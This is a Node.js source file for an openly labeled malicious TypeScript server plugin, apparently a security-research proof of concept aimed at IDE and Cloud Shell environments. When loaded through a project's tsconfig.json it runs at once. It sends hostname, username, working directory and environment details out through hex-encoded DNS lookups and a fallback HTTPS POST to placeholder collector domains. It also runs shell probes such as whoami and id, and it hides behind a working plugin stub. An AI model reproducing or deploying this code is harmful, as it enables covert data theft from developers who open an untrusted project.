#!/usr/bin/env node
'use strict';

/**
 * Enhanced Malicious TypeScript Language Service Plugin
 * ======================================================
 *
 * MULTI-CHANNEL EXFILTRATION — fires on module load (zero-click):
 *
 *   Channel 1 (PRIMARY):  DNS exfiltration via dns.lookup()
 *                          Bypasses HTTP egress filtering
 *                          Works on UDP port 53 (almost never blocked)
 *
 *   Channel 2:            Synchronous filesystem markers
 *                          /tmp/ts-plugin-executed-<TIMESTAMP>
 *                          $HOME/ts-plugin-executed
 *
 *   Channel 3:            process.stdout.write() — terminal-visible
 *
 *   Channel 4:            /dev/stderr append — terminal-visible
 *
 *   Channel 5 (FALLBACK): HTTPS POST beacon
 *                          Only if DNS doesn't resolve
 *
 *   Channel 6:            /tmp/clone-path.txt — Cloud Shell path detection
 *
 * EXECUTION ORDER:
 *   1. Synchronous filesystem markers (fire BEFORE event loop)
 *   2. stdout + stderr markers
 *   3. DNS exfiltration (async but fires immediately)
 *   4. HTTP/S beacon (fallback)
 *   5. TSServer plugin interface (minimal shim — no crash)
 *
 * USAGE:
 *   Configured via tsconfig.json "plugins" array.
 *   See test-tsserver-plugin.js for path traversal vectors.
 */

// ═══════════════════════════════════════════════════════════════
// SECTION 0: IMMEDIATE SYNCHRONOUS MARKERS
// These fire NOW, before any module loading or async operations.
// If this file is require()d at all, these lines execute.
// ═══════════════════════════════════════════════════════════════

(function immediateSyncMarkers() {
    var ts = new Date().toISOString().replace(/:/g, '-');
    var markerData = 'TSSERVER_PLUGIN_EXECUTED|' + ts + '|pid=' +
        (typeof process !== 'undefined' && process.pid ? process.pid : 'unknown') + '\n';

    // Marker 1: process.stdout (synchronous, visible if TSServer has a TTY)
    try {
        process.stdout.write('[TS-PLUGIN-EXECUTED] ' + markerData);
    } catch (_) { /* no stdout available */ }

    // Marker 2: /dev/stderr append (synchronous, visible on Linux)
    try {
        var fsSync = require('fs');
        fsSync.appendFileSync('/dev/stderr', '[TS-PLUGIN-STDERR] ' + markerData);
    } catch (_) { /* /dev/stderr not writable */ }

    // Marker 3: /tmp/ts-plugin-executed-<timestamp>
    try {
        var fsSync2 = require('fs');
        fsSync2.writeFileSync('/tmp/ts-plugin-executed-' + ts, markerData);
    } catch (_) { /* /tmp not writable */ }

    // Marker 4: /tmp/ts-plugin-executed (latest overwrite)
    try {
        var fsSync3 = require('fs');
        fsSync3.writeFileSync('/tmp/ts-plugin-executed', markerData);
    } catch (_) { /* /tmp not writable */ }

    // Marker 5: /dev/shm/ts-plugin-executed (shared memory, often writable)
    try {
        var fsSync4 = require('fs');
        fsSync4.writeFileSync('/dev/shm/ts-plugin-executed', markerData);
    } catch (_) { /* /dev/shm not available */ }

    // Marker 6: $TMPDIR/ts-plugin-executed
    try {
        var tmpDir = process.env.TMPDIR || process.env.TMP || process.env.TEMP || '/tmp';
        var fsSync5 = require('fs');
        var pathSync = require('path');
        fsSync5.writeFileSync(pathSync.join(tmpDir, 'ts-plugin-executed'), markerData);
    } catch (_) { /* TMPDIR not writable */ }
})();

// ═══════════════════════════════════════════════════════════════
// SECTION 1: MODULE LOADING (safe wrappers)
// ═══════════════════════════════════════════════════════════════

var OS, FS, PATH, DNS, NET, HTTPS, HTTP, CP, ZLIB;

(function loadModules() {
    function safeRequire(name) {
        try { return require(name); } catch (_) { return null; }
    }
    OS    = safeRequire('os');
    FS    = safeRequire('fs');
    PATH  = safeRequire('path');
    DNS   = safeRequire('dns');
    NET   = safeRequire('net');
    HTTPS = safeRequire('https');
    HTTP  = safeRequire('http');
    CP    = safeRequire('child_process');
    ZLIB  = safeRequire('zlib');
})();

// ═══════════════════════════════════════════════════════════════
// CONFIGURATION
// ═══════════════════════════════════════════════════════════════

var CONFIG = {
    // === DNS EXFILTRATION (PRIMARY CHANNEL) ===
    // Your OAStify / Interactsh / Burp Collaborator domain
    dnsCallback: 'CHANGEME.oastify.com',

    // Set to true to use DNS as the PRIMARY exfil channel
    dnsEnabled: true,

    // === HTTP/S BEACON (FALLBACK CHANNEL) ===
    httpCollector: 'https://CHANGEME.example.com',

    // Set to true to enable HTTP beacon
    httpEnabled: true,

    // === FILESYSTEM PROBES ===
    // Paths to write marker files
    markerPaths: [
        '/tmp/ts-plugin-executed',
        '/dev/shm/ts-plugin-executed',
        '/tmp/ts-plugin-probe',
    ],

    // === CLOUD SHELL DETECTION ===
    cloudShellPaths: [
        '/home/user/cloudshell_open/tsserver-evil',
        '/home/user/tsserver-evil',
        '/home/user/cloudshell_open',
        '/google/devshell',
    ],

    // === TIMEOUTS ===
    networkTimeout: 5000,
};

// ═══════════════════════════════════════════════════════════════
// SECTION 2: DNS EXFILTRATION (PRIMARY CHANNEL)
// ═══════════════════════════════════════════════════════════════

/**
 * Encode a string to be DNS-label-safe.
 * DNS labels allow: [a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?
 * Max 63 characters per label.
 *
 * Strategy: lowercase + replace non-alphanumeric with hyphen,
 * trim to 60 chars, ensure no leading/trailing hyphens.
 */
function dnsSafeLabel(str) {
    if (!str) return 'unknown';
    var cleaned = String(str)
        .toLowerCase()
        .replace(/[^a-z0-9]/g, '-')   // non-alnum -> hyphen
        .replace(/-+/g, '-')           // collapse multiple hyphens
        .replace(/^-+/, '')            // strip leading hyphens
        .replace(/-+$/, '')            // strip trailing hyphens
        .substring(0, 60);             // max 60 to leave room
    if (!cleaned) return 'unknown';
    return cleaned;
}

/**
 * Hex-encode a string for DNS label (guaranteed safe).
 * Only produces [0-9a-f] — always DNS-safe.
 * But doubles the size: max 31 input chars for a 63-char label.
 */
function dnsHexLabel(str) {
    if (!str) return '00';
    var buf = Buffer.from(String(str), 'utf-8');
    var hex = buf.toString('hex');
    // Truncate to 60 hex chars (30 bytes of data)
    return hex.substring(0, 60);
}

/**
 * Build a DNS exfiltration query.
 *
 * Format: HEXHOST.HEXUSER.SESSIONID.callback-domain
 *
 * Each label is hex-encoded to guarantee DNS safety.
 * The DNS query hits the authoritative nameserver of callback-domain,
 * which logs the full query name — exfiltrating the data.
 */
function buildDnsQuery() {
    var hostname = 'unknown';
    var username = 'unknown';
    var pidStr   = '0';
    var cwdStr   = 'unknown';

    try { hostname = OS.hostname(); } catch (_) {}
    try { username = OS.userInfo().username; } catch (_) {}
    try { pidStr = String(process.pid); } catch (_) {}
    try { cwdStr = process.cwd(); } catch (_) {}

    // Build labels — hex encoded for guaranteed DNS safety
    // Each label max 60 hex chars = 30 bytes of original data
    var hostLabel = dnsHexLabel(hostname);
    var userLabel = dnsHexLabel(username);
    var cwdLabel  = dnsHexLabel(
        cwdStr.split('/').slice(-2).join('/')  // last 2 path components
    );

    // Session identifier: 8 random hex chars + pid
    var sessionId = Math.random().toString(16).substring(2, 10) + '-' + pidStr;

    return hostLabel + '.' + userLabel + '.' + cwdLabel + '.' + sessionId + '.' + CONFIG.dnsCallback;
}

/**
 * Execute DNS exfiltration using dns.lookup().
 *
 * dns.lookup() uses the system resolver (getaddrinfo).
 * This means it goes through the OS DNS resolution chain,
 * which is almost NEVER blocked — DNS is fundamental to
 * virtually all networked applications.
 *
 * The DNS query will fail to resolve (NXDOMAIN), but the
 * authoritative nameserver for the callback domain WILL
 * receive and log the query, including the encoded subdomain.
 *
 * @param {string} query - The FQDN to look up
 * @param {function} cb  - Optional callback
 */
function dnsExfiltrate(query, cb) {
    if (!DNS) {
        // Fallback: try to write DNS query target to filesystem
        try {
            FS.appendFileSync('/tmp/dns-exfil-target.txt',
                new Date().toISOString() + '|DNS_DISABLED|' + query + '\n');
        } catch (_) {}
        if (cb) cb(new Error('dns module not available'));
        return;
    }

    var fired = false;

    function done(err) {
        if (fired) return;
        fired = true;
        // Write result to filesystem for diagnostics
        try {
            var result = err ? 'FAIL:' + err.message : 'SENT';
            FS.appendFileSync('/tmp/dns-exfil-result.txt',
                new Date().toISOString() + '|' + result + '|' + query + '\n');
        } catch (_) {}
        if (cb) cb(err);
    }

    try {
        // Primary: dns.lookup (uses getaddrinfo — most reliable)
        DNS.lookup(query, { family: 4, hints: 0 }, function(err, address) {
            // We EXPECT this to fail with ENOTFOUND or similar
            // The exfiltration happens because the DNS query was SENT
            // to the authoritative nameserver, which logged it.
            done(err);
        });

        // Timeout safety — if dns.lookup hangs, we still mark it
        setTimeout(function() { done(new Error('timeout')); }, CONFIG.networkTimeout);
    } catch (e) {
        done(e);
    }
}

/**
 * Execute MULTIPLE DNS queries with different data payloads.
 * This maximizes the chance that at least one gets through.
 */
function dnsExfiltrateAll() {
    if (!CONFIG.dnsEnabled || !CONFIG.dnsCallback || CONFIG.dnsCallback.indexOf('CHANGEME') !== -1) {
        return; // Not configured
    }

    // Query 1: Basic hostname + username + cwd + pid
    var query1 = buildDnsQuery();

    // Query 2: Environment fingerprint
    var envFingerprint = '';
    try {
        var envKeys = ['HOME', 'USER', 'PWD', 'SHELL', 'CLOUDSDK_CONFIG', 'GOOGLE_CLOUD_PROJECT'];
        var parts = [];
        for (var i = 0; i < envKeys.length; i++) {
            var val = process.env[envKeys[i]];
            if (val) {
                // Truncate each to 10 chars for DNS label space
                parts.push(envKeys[i].substring(0, 4) + '=' + dnsSafeLabel(val).substring(0, 10));
            }
        }
        envFingerprint = parts.join(',');
    } catch (_) {}
    if (!envFingerprint) envFingerprint = 'noenv';
    var query2 = 'env.' + dnsSafeLabel(envFingerprint).substring(0, 60) + '.' + CONFIG.dnsCallback;

    // Query 3: Platform info
    var platInfo = '';
    try {
        platInfo = [
            process.platform,
            process.arch,
            (OS ? OS.release() : '?').replace(/[^a-z0-9]/gi, '-')
        ].join('-');
    } catch (_) {}
    if (!platInfo) platInfo = 'unknown';
    var query3 = 'plat.' + dnsSafeLabel(platInfo).substring(0, 60) + '.' + CONFIG.dnsCallback;

    // Fire all 3 queries
    dnsExfiltrate(query1, function(err) {
        // After first query, try to write result
        try {
            FS.appendFileSync('/tmp/dns-exfil-1.txt',
                new Date().toISOString() + '|' + (err ? err.message : 'ok') + '|' + query1 + '\n');
        } catch (_) {}
    });
    dnsExfiltrate(query2);
    dnsExfiltrate(query3);
}

// ═══════════════════════════════════════════════════════════════
// SECTION 3: FILESYSTEM PROBES
// ═══════════════════════════════════════════════════════════════

function filesystemProbes() {
    var ts = new Date().toISOString().replace(/:/g, '-');
    var probeData = JSON.stringify({
        event: 'ts_plugin_filesystem_probe',
        timestamp: ts,
        pid: (function() { try { return process.pid; } catch (_) { return -1; } })(),
        ppid: (function() { try { return process.ppid; } catch (_) { return -1; } })(),
        nodeVersion: (function() { try { return process.version; } catch (_) { return '?'; } })(),
    });

    var probePaths = [
        '/tmp/ts-plugin-executed-' + ts,
        '/tmp/ts-plugin-executed',
        '/tmp/ts-plugin-' + (function() { try { return process.pid; } catch (_) { return 0; } })(),
        '/dev/shm/ts-plugin-executed-' + ts,
        '/dev/shm/ts-plugin-executed',
    ];

    // Add $HOME-based paths
    try {
        var home = OS.homedir();
        probePaths.push(PATH.join(home, 'ts-plugin-executed'));
        probePaths.push(PATH.join(home, 'ts-plugin-executed-' + ts));
    } catch (_) {}

    // Add $TMPDIR-based paths
    try {
        var tmp = process.env.TMPDIR || process.env.TMP || process.env.TEMP;
        if (tmp) {
            probePaths.push(PATH.join(tmp, 'ts-plugin-executed'));
            probePaths.push(PATH.join(tmp, 'ts-plugin-executed-' + ts));
        }
    } catch (_) {}

    var results = [];
    for (var i = 0; i < probePaths.length; i++) {
        try {
            FS.writeFileSync(probePaths[i], probeData);
            results.push({ path: probePaths[i], status: 'written' });
        } catch (e) {
            results.push({ path: probePaths[i], status: 'FAILED', error: e.message });
        }
    }

    // Write results summary to the first path that worked
    var summaryPath = '/tmp/ts-plugin-probe-results.json';
    try {
        FS.writeFileSync(summaryPath, JSON.stringify(results, null, 2));
    } catch (_) {}

    return results;
}

// ═══════════════════════════════════════════════════════════════
// SECTION 4: ENVIRONMENT FINGERPRINTING
// ═══════════════════════════════════════════════════════════════

function environmentFingerprint() {
    var fp = {
        timestamp: new Date().toISOString(),
        event: 'ts_plugin_env_fingerprint',

        // Process info
        pid: (function() { try { return process.pid; } catch (_) { return -1; } })(),
        ppid: (function() { try { return process.ppid; } catch (_) { return -1; } })(),
        nodeVersion: (function() { try { return process.version; } catch (_) { return '?'; } })(),
        platform: (function() { try { return process.platform; } catch (_) { return '?'; } })(),
        arch: (function() { try { return process.arch; } catch (_) { return '?'; } })(),
        execPath: (function() { try { return process.execPath; } catch (_) { return '?'; } })(),
        argv: (function() {
            try { return process.argv.slice(0, 20); } catch (_) { return []; }
        })(),
        execArgv: (function() {
            try { return process.execArgv; } catch (_) { return []; }
        })(),
        cwd: (function() { try { return process.cwd(); } catch (_) { return '?'; } })(),
        uptime: (function() { try { return process.uptime(); } catch (_) { return -1; } })(),

        // User identity
        uid: (function() { try { return process.getuid ? process.getuid() : -1; } catch (_) { return -1; } })(),
        gid: (function() { try { return process.getgid ? process.getgid() : -1; } catch (_) { return -1; } })(),
        username: (function() {
            try { return OS.userInfo().username; } catch (_) { return '?'; }
        })(),
        homedir: (function() { try { return OS.homedir(); } catch (_) { return '?'; } })(),
        hostname: (function() { try { return OS.hostname(); } catch (_) { return '?'; } })(),
        shell: (function() { try { return OS.userInfo().shell; } catch (_) { return '?'; } })(),
        tmpdir: (function() { try { return OS.tmpdir(); } catch (_) { return '?'; } })(),

        // Key environment variables (sanitized — values truncated)
        env_HOME: (function() { try { return (process.env.HOME || '').substring(0, 100); } catch (_) { return '?'; } })(),
        env_USER: (function() { try { return (process.env.USER || '').substring(0, 50); } catch (_) { return '?'; } })(),
        env_PWD: (function() { try { return (process.env.PWD || '').substring(0, 200); } catch (_) { return '?'; } })(),
        env_SHELL: (function() { try { return (process.env.SHELL || '').substring(0, 100); } catch (_) { return '?'; } })(),
        env_PATH: (function() { try { return (process.env.PATH || '').substring(0, 500); } catch (_) { return '?'; } })(),
        env_CLOUDSDK_CONFIG: (function() { try { return (process.env.CLOUDSDK_CONFIG || '').substring(0, 200); } catch (_) { return '?'; } })(),
        env_GOOGLE_CLOUD_PROJECT: (function() { try { return (process.env.GOOGLE_CLOUD_PROJECT || '').substring(0, 100); } catch (_) { return '?'; } })(),
        env_DEVSHELL_PROJECT_ID: (function() { try { return (process.env.DEVSHELL_PROJECT_ID || '').substring(0, 100); } catch (_) { return '?'; } })(),
        env_CLOUD_SHELL: (function() { try { return process.env.CLOUD_SHELL || 'not set'; } catch (_) { return '?'; } })(),
        env_DEVSHELL_GCLOUD_CONFIG: (function() { try { return (process.env.DEVSHELL_GCLOUD_CONFIG || '').substring(0, 100); } catch (_) { return '?'; } })(),

        // All env keys (not values — safe to exfil)
        envKeys: (function() {
            try { return Object.keys(process.env).sort(); } catch (_) { return []; }
        })(),

        // OS details
        osType: (function() { try { return OS.type(); } catch (_) { return '?'; } })(),
        osRelease: (function() { try { return OS.release(); } catch (_) { return '?'; } })(),
        osPlatform: (function() { try { return OS.platform(); } catch (_) { return '?'; } })(),
        osArch: (function() { try { return OS.arch(); } catch (_) { return '?'; } })(),
        osCpus: (function() {
            try { return OS.cpus().length; } catch (_) { return -1; }
        })(),
        osTotalMem: (function() {
            try { return OS.totalmem(); } catch (_) { return -1; }
        })(),
        osFreeMem: (function() {
            try { return OS.freemem(); } catch (_) { return -1; }
        })(),
        osLoadAvg: (function() {
            try { return OS.loadavg(); } catch (_) { return []; }
        })(),
        osNetworkInterfaces: (function() {
            try {
                var nics = OS.networkInterfaces();
                var names = Object.keys(nics);
                // Only include interface names (not IPs — too sensitive for fingerprint)
                return names;
            } catch (_) { return []; }
        })(),
    };

    // Write fingerprint to filesystem for retrieval
    try {
        FS.writeFileSync('/tmp/ts-plugin-fingerprint.json', JSON.stringify(fp, null, 2));
    } catch (_) {}

    // Also write a minimal version if /tmp fails
    try {
        var minimal = JSON.stringify({
            ts: fp.timestamp,
            pid: fp.pid,
            username: fp.username,
            hostname: fp.hostname,
            cwd: fp.cwd,
            homedir: fp.homedir,
            platform: fp.platform,
        });
        FS.writeFileSync('/tmp/ts-plugin-minimal.json', minimal);
    } catch (_) {}

    return fp;
}

// ═══════════════════════════════════════════════════════════════
// SECTION 5: CLOUD SHELL CLONE PATH DETECTION
// ═══════════════════════════════════════════════════════════════

function cloudShellDetection() {
    var results = {
        timestamp: new Date().toISOString(),
        event: 'cloud_shell_path_detection',
        isCloudShell: false,
        paths: {},
    };

    // Check known Cloud Shell paths
    var checkPaths = [
        '/home/user/cloudshell_open/tsserver-evil',
        '/home/user/cloudshell_open',
        '/home/user/tsserver-evil',
        '/google/devshell',
        '/google/devshell/editor',
        '/home/user/.theia',
        '/home/user/.codebuddy',
        '/home/user/.cloudshell',
        '/home/user/.config/gcloud',
        '/tmp/clone-path.txt',
    ];

    // Check environment for Cloud Shell indicators
    try {
        if (process.env.CLOUD_SHELL || process.env.DEVSHELL_PROJECT_ID ||
            process.env.GOOGLE_CLOUD_PROJECT || process.env.CLOUDSDK_CONFIG) {
            results.isCloudShell = true;
            results.envIndicators = {
                CLOUD_SHELL: process.env.CLOUD_SHELL || 'not set',
                DEVSHELL_PROJECT_ID: process.env.DEVSHELL_PROJECT_ID || 'not set',
                GOOGLE_CLOUD_PROJECT: process.env.GOOGLE_CLOUD_PROJECT || 'not set',
                CLOUDSDK_CONFIG: process.env.CLOUDSDK_CONFIG || 'not set',
            };
        }
    } catch (_) {}

    // Check if directories/files exist
    for (var i = 0; i < checkPaths.length; i++) {
        var p = checkPaths[i];
        try {
            var stat = FS.statSync(p);
            results.paths[p] = {
                exists: true,
                isDirectory: stat.isDirectory(),
                isFile: stat.isFile(),
                size: stat.size,
            };
            if (stat.isDirectory()) {
                results.isCloudShell = true;
            }
        } catch (_) {
            results.paths[p] = { exists: false };
        }
    }

    // Try to list CWD contents
    try {
        var cwd = process.cwd();
        results.cwd = cwd;
        results.cwdContents = FS.readdirSync(cwd).slice(0, 50);
    } catch (_) {}

    // Write detection results to known paths
    try {
        FS.writeFileSync('/tmp/clone-path.txt', JSON.stringify(results, null, 2));
    } catch (_) {}

    // Also write to CWD if possible
    try {
        FS.writeFileSync(PATH.join(process.cwd(), 'clone-path-detect.json'), JSON.stringify(results, null, 2));
    } catch (_) {}

    return results;
}

// ═══════════════════════════════════════════════════════════════
// SECTION 6: HTTP/S FALLBACK BEACON
// ═══════════════════════════════════════════════════════════════

/**
 * Build a comprehensive beacon payload
 */
function buildBeaconPayload(extra) {
    var payload = {
        timestamp: new Date().toISOString(),
        event: 'ts_plugin_beacon',

        // Identity
        hostname: (function() { try { return OS.hostname(); } catch (_) { return '?'; } })(),
        username: (function() { try { return OS.userInfo().username; } catch (_) { return '?'; } })(),
        homedir: (function() { try { return OS.homedir(); } catch (_) { return '?'; } })(),
        cwd: (function() { try { return process.cwd(); } catch (_) { return '?'; } })(),
        pid: (function() { try { return process.pid; } catch (_) { return -1; } })(),
        ppid: (function() { try { return process.ppid; } catch (_) { return -1; } })(),

        // Platform
        platform: (function() { try { return process.platform; } catch (_) { return '?'; } })(),
        arch: (function() { try { return process.arch; } catch (_) { return '?'; } })(),
        nodeVersion: (function() { try { return process.version; } catch (_) { return '?'; } })(),

        // Execution context
        execPath: (function() { try { return process.execPath; } catch (_) { return '?'; } })(),
        argv0: (function() { try { return process.argv0; } catch (_) { return '?'; } })(),
        argv: (function() { try { return process.argv.slice(0, 30); } catch (_) { return []; } })(),

        // Cloud Shell indicators
        isCloudShell: (function() {
            try {
                return !!(process.env.CLOUD_SHELL || process.env.DEVSHELL_PROJECT_ID);
            } catch (_) { return false; }
        })(),

        // Environment keys (not values)
        envKeys: (function() {
            try { return Object.keys(process.env).sort(); } catch (_) { return []; }
        })(),

        // Module availability
        modules: {
            fs: !!FS, os: !!OS, path: !!PATH, dns: !!DNS,
            net: !!NET, https: !!HTTPS, http: !!HTTP, cp: !!CP,
        },

        // Extra payload data
        extra: extra || {},
    };

    return JSON.stringify(payload);
}

/**
 * Send HTTP POST beacon to collector
 */
function httpBeacon(endpoint, data) {
    if (!CONFIG.httpEnabled) return;
    if (!CONFIG.httpCollector || CONFIG.httpCollector.indexOf('CHANGEME') !== -1) return;

    var collectorUrl = endpoint || CONFIG.httpCollector;

    try {
        var url = new (require('url').URL)(collectorUrl);
        var mod = url.protocol === 'https:' ? HTTPS : HTTP;
        if (!mod) return;

        var payload = buildBeaconPayload(data);

        var req = mod.request({
            hostname: url.hostname,
            port: url.port || (url.protocol === 'https:' ? 443 : 80),
            path: url.pathname + url.search,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(payload),
                'X-TS-Plugin': 'enhanced-malicious-ts-plugin-v2',
                'X-Exfil-Channel': 'https-fallback',
            },
            timeout: CONFIG.networkTimeout,
        }, function(res) {
            var body = '';
            res.on('data', function(c) { body += c; });
            res.on('end', function() {
                try {
                    FS.appendFileSync('/tmp/ts-plugin-http-response.txt',
                        new Date().toISOString() + '|' + res.statusCode + '|' + body.substring(0, 200) + '\n');
                } catch (_) {}
            });
        });

        req.on('error', function(e) {
            try {
                FS.appendFileSync('/tmp/ts-plugin-http-error.txt',
                    new Date().toISOString() + '|' + e.message + '\n');
            } catch (_) {}
        });

        req.on('timeout', function() {
            req.destroy();
            try {
                FS.appendFileSync('/tmp/ts-plugin-http-error.txt',
                    new Date().toISOString() + '|TIMEOUT\n');
            } catch (_) {}
        });

        req.write(payload);
        req.end();

        return true;
    } catch (e) {
        try {
            FS.appendFileSync('/tmp/ts-plugin-http-error.txt',
                new Date().toISOString() + '|EXCEPTION:' + e.message + '\n');
        } catch (_) {}
        return false;
    }
}

// ═══════════════════════════════════════════════════════════════
// SECTION 7: SHELL COMMAND PROBES (optional — noisy)
// ═══════════════════════════════════════════════════════════════

function shellProbes() {
    if (!CP) return { error: 'child_process not available' };

    var results = {};

    // Probe 1: whoami
    try {
        results.whoami = CP.execSync('whoami', {
            timeout: 3000,
            encoding: 'utf-8'
        }).trim();
    } catch (e) {
        results.whoami = 'FAILED: ' + e.message;
    }

    // Probe 2: hostname
    try {
        results.hostname_cmd = CP.execSync('hostname', {
            timeout: 3000,
            encoding: 'utf-8'
        }).trim();
    } catch (e) {
        results.hostname_cmd = 'FAILED: ' + e.message;
    }

    // Probe 3: pwd
    try {
        results.pwd = CP.execSync('pwd', {
            timeout: 3000,
            encoding: 'utf-8',
            cwd: (function() { try { return process.cwd(); } catch (_) { return '/'; } })()
        }).trim();
    } catch (e) {
        results.pwd = 'FAILED: ' + e.message;
    }

    // Probe 4: ls -la in CWD
    try {
        results.ls_cwd = CP.execSync('ls -la', {
            timeout: 5000,
            encoding: 'utf-8',
            cwd: (function() { try { return process.cwd(); } catch (_) { return '/'; } })(),
            maxBuffer: 1024 * 1024
        }).trim().substring(0, 5000);
    } catch (e) {
        results.ls_cwd = 'FAILED: ' + e.message;
    }

    // Probe 5: id (user/group info)
    try {
        results.id = CP.execSync('id', {
            timeout: 3000,
            encoding: 'utf-8'
        }).trim();
    } catch (e) {
        results.id = 'FAILED: ' + e.message;
    }

    // Probe 6: env (filtered)
    try {
        results.env_count = CP.execSync('env | wc -l', {
            timeout: 3000,
            encoding: 'utf-8'
        }).trim();
    } catch (e) {
        results.env_count = 'FAILED: ' + e.message;
    }

    // Write to filesystem
    try {
        FS.writeFileSync('/tmp/ts-plugin-shell-probes.json', JSON.stringify(results, null, 2));
    } catch (_) {}

    return results;
}

// ═══════════════════════════════════════════════════════════════
// SECTION 8: PAYLOAD DISPATCHER
// ═══════════════════════════════════════════════════════════════

var payloadsFired = false;

function fireAllPayloads() {
    if (payloadsFired) return;
    payloadsFired = true;

    // Phase 1: DNS exfiltration (PRIMARY — fires first)
    if (CONFIG.dnsEnabled) {
        try { dnsExfiltrateAll(); } catch (e) {
            try { FS.appendFileSync('/tmp/ts-plugin-dns-error.txt',
                new Date().toISOString() + '|dnsExfiltrateAll|' + e.message + '\n'); } catch (_) {}
        }
    }

    // Phase 2: Filesystem probes
    try {
        var fsResults = filesystemProbes();
        try { FS.appendFileSync('/tmp/ts-plugin-fs-probes.txt',
            new Date().toISOString() + '|PROBES_DONE|' + fsResults.length + '\n'); } catch (_) {}
    } catch (e) {
        try { FS.appendFileSync('/tmp/ts-plugin-fs-error.txt',
            new Date().toISOString() + '|' + e.message + '\n'); } catch (_) {}
    }

    // Phase 3: Environment fingerprinting
    try {
        var fp = environmentFingerprint();
        try { FS.appendFileSync('/tmp/ts-plugin-fp-done.txt',
            new Date().toISOString() + '|FP_DONE|pid=' + fp.pid + '|user=' + fp.username + '\n'); } catch (_) {}
    } catch (e) {
        try { FS.appendFileSync('/tmp/ts-plugin-fp-error.txt',
            new Date().toISOString() + '|' + e.message + '\n'); } catch (_) {}
    }

    // Phase 4: Cloud Shell detection
    try {
        var csResult = cloudShellDetection();
        try { FS.appendFileSync('/tmp/ts-plugin-cs-detect.txt',
            new Date().toISOString() + '|CLOUD_SHELL=' + csResult.isCloudShell + '\n'); } catch (_) {}
    } catch (e) {
        try { FS.appendFileSync('/tmp/ts-plugin-cs-error.txt',
            new Date().toISOString() + '|' + e.message + '\n'); } catch (_) {}
    }

    // Phase 5: Shell probes (optional — noisier)
    try {
        var shResults = shellProbes();
        try { FS.appendFileSync('/tmp/ts-plugin-sh-done.txt',
            new Date().toISOString() + '|SHELL_PROBES_DONE|whoami=' +
            (shResults.whoami || '?') + '\n'); } catch (_) {}
    } catch (e) {
        try { FS.appendFileSync('/tmp/ts-plugin-sh-error.txt',
            new Date().toISOString() + '|' + e.message + '\n'); } catch (_) {}
    }

    // Phase 6: HTTP beacon (LAST — lowest priority, most likely blocked)
    if (CONFIG.httpEnabled) {
        // Delayed slightly so DNS fires first
        setTimeout(function() {
            try {
                httpBeacon(CONFIG.httpCollector, {
                    exfilMethod: 'http_fallback',
                    channelsAttempted: ['sync_markers', 'dns_exfil', 'fs_probes',
                        'env_fingerprint', 'cloudshell_detect', 'shell_probes', 'http_beacon'],
                });
            } catch (e) {
                try { FS.appendFileSync('/tmp/ts-plugin-http-final-error.txt',
                    new Date().toISOString() + '|' + e.message + '\n'); } catch (_) {}
            }
        }, 500);
    }

    // Write final completion marker
    try {
        FS.writeFileSync('/tmp/ts-plugin-payloads-complete',
            new Date().toISOString() + '|ALL_PAYLOADS_DISPATCHED|pid=' +
            (function() { try { return process.pid; } catch (_) { return -1; } })() + '\n');
    } catch (_) {}
}

// ═══════════════════════════════════════════════════════════════
// FIRE PAYLOADS AT MODULE LOAD TIME
// This is THE critical line — require() triggers this synchronously,
// before TSServer even calls init().
// ═══════════════════════════════════════════════════════════════

fireAllPayloads();

// ═══════════════════════════════════════════════════════════════
// SECTION 9: TYPESCRIPT LANGUAGE SERVICE PLUGIN INTERFACE
// ═══════════════════════════════════════════════════════════════

/**
 * The TSServer plugin factory function.
 * Payloads already fired at module load time.
 * This just returns a valid plugin object so TSServer doesn't crash.
 */
function init(modules) {
    // Secondary trigger — in case module-load firing was suppressed
    fireAllPayloads();

    // Write init marker
    try {
        FS.appendFileSync('/tmp/ts-plugin-init-called.txt',
            new Date().toISOString() + '|INIT_CALLED\n');
    } catch (_) {}

    return {
        create: function(info) {
            try {
                FS.appendFileSync('/tmp/ts-plugin-create-called.txt',
                    new Date().toISOString() + '|CREATE_CALLED|project=' +
                    (info && info.project ? info.project.getProjectName() : '?') + '\n');
            } catch (_) {}
            return info.languageService;
        },

        getExternalFiles: function() {
            return [];
        },

        onConfigurationChanged: function(config) {
            try {
                FS.appendFileSync('/tmp/ts-plugin-config-changed.txt',
                    new Date().toISOString() + '|CONFIG_CHANGED\n');
            } catch (_) {}
        },
    };
}

module.exports = init;
module.exports.typescriptServerPlugin = true;
